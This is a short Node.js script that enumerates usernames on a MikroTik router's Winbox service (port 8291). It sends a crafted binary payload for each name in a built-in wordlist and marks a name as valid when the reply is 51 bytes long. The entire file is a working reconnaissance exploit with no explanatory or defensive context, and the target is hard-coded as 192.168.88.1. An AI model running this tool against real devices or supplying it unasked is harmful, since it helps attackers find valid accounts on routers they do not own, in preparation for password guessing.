const net = require('net');

const targetIp = "192.168.88.1";
const port = 8291;

const usernames = [
    "admin",
    "test",
    "guest",
    "technik",
    "nimda",
    "marek",
    "michal",
    "mikrotik",
    "mt",
    "support",
    "user",
    "admin123",
    "admin1234",
    "",
];

function createPayload(basePayload, username) {
    const length = username.length;
    const firstByte = Buffer.from([0x22 + length]);
    const usernameBuffer = Buffer.from(username, 'utf8');
    return Buffer.concat([firstByte, basePayload.slice(1, 2), usernameBuffer, basePayload.slice(2)]);
}

function sendRequest(payload, target, port, username) {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(5000);

        socket.connect(port, target, () => socket.write(payload));

        socket.on('data', (data) => {
            console.log(`${username}: ${data.length === 51 ? 'valid' : 'invalid'}`);
            socket.destroy();
            resolve();
        });

        socket.on('error', () => {
            console.log(`${username}: invalid`);
            socket.destroy();
            resolve();
        });

        socket.on('timeout', () => {
            console.log(`${username}: invalid`);
            socket.destroy();
            resolve();
        });
    });
}

async function main() {
    const basePayload = Buffer.from([
        0x22, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    ]);

    for (const username of usernames) {
        const payload = createPayload(basePayload, username);
        await sendRequest(payload, targetIp, port, username);
    }
}

main().catch(err => console.error(err));